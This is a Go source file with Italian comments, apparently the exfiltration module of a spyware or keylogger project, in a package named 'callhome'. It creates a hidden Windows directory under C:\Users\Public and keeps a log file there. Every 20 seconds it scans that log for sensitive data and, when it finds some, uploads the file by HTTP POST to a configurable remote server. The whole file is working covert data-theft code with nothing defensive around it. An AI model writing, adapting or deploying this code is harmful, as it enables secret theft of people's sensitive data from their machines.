package callhome

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"syscall"
	"time"

	"projectThree/detection"
)

var (
	logFile   = "log.txt"               // Percorso del file log, sovrascritto dopo l'inizializzazione
	serverURL = "http://localhost:8080" // URL del server
)

// setHidden imposta una directory come nascosta su Windows
func setHidden(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	attr := uint32(syscall.FILE_ATTRIBUTE_HIDDEN)
	return syscall.SetFileAttributes(pathPtr, attr)
}

// InitLogDirectory crea una directory nascosta per i log
func InitLogDirectory() {
	hiddenDir := "C:\\Users\\Public\\MyHiddenLogs"

	// Crea la directory se non esiste
	if _, err := os.Stat(hiddenDir); os.IsNotExist(err) {
		fmt.Println("La directory non esiste. Creazione in corso...")
		if err := os.Mkdir(hiddenDir, 0755); err != nil {
			fmt.Println("Errore nella creazione della directory:", err)
			return
		}
		// Imposta la directory come nascosta
		if err := setHidden(hiddenDir); err != nil {
			fmt.Println("Errore nell'impostazione della directory come nascosta:", err)
		} else {
			fmt.Println("Directory nascosta creata:", hiddenDir)
		}
	} else {
		fmt.Println("Directory già esistente:", hiddenDir)
	}

	logFile = hiddenDir + "\\log.txt" // Imposta il percorso per log.txt
	fmt.Println("Percorso log file configurato:", logFile)
}

// InitLogFile assicura che il file log.txt sia sempre creato e accessibile
func InitLogFile() error {
	file, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Errore nella creazione del file log.txt: %v\n", err)
		return err
	}
	defer file.Close()

	fmt.Printf("File log.txt creato correttamente: %s\n", logFile)
	return nil
}

// InitServerURL configura l'URL del server
func InitServerURL(url string) {
	serverURL = url
	fmt.Println("URL del server configurato:", serverURL)
}

// GetLogFilePath restituisce il percorso attuale del file log.txt
func GetLogFilePath() string {
	fmt.Printf("Percorso del file log: %s\n", logFile)
	return logFile
}

// MonitorFileAndSend controlla il file log.txt ogni 20 secondi per dati sensibili e lo invia al server se necessario
func MonitorFileAndSend() {
	for {
		time.Sleep(20 * time.Second)
		fmt.Println("Analisi in corso del file log.txt...")

		// Utilizza DetectSensitiveDataFromFile per analizzare il file
		if detection.DetectSensitiveDataFromFile(GetLogFilePath()) {
			fmt.Println("Dati sensibili trovati, invio il file al server...")
			if err := uploadFile(); err != nil {
				fmt.Println("Errore durante l'invio del file:", err)
			} else {
				fmt.Println("File inviato con successo.")
			}
		} else {
			fmt.Println("Nessun dato sensibile rilevato. Il file rimane locale.")
		}
	}
}

// uploadFile invia il file log.txt al server
func uploadFile() error {
	if serverURL == "" {
		return fmt.Errorf("URL del server non configurato")
	}

	file, err := os.Open(logFile)
	if err != nil {
		return fmt.Errorf("errore nell'apertura del file: %w", err)
	}
	defer file.Close()

	// Crea una richiesta HTTP multipart
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(logFile))
	if err != nil {
		return fmt.Errorf("errore nella creazione del form: %w", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("errore nella copia del file: %w", err)
	}
	writer.Close()

	// Invia la richiesta
	req, err := http.NewRequest("POST", serverURL+"/upload", body)
	if err != nil {
		return fmt.Errorf("errore nella creazione della richiesta HTTP: %w", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("errore durante l'invio della richiesta: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("errore del server: %s", resp.Status)
	}

	fmt.Println("File inviato con successo.")
	return nil
}
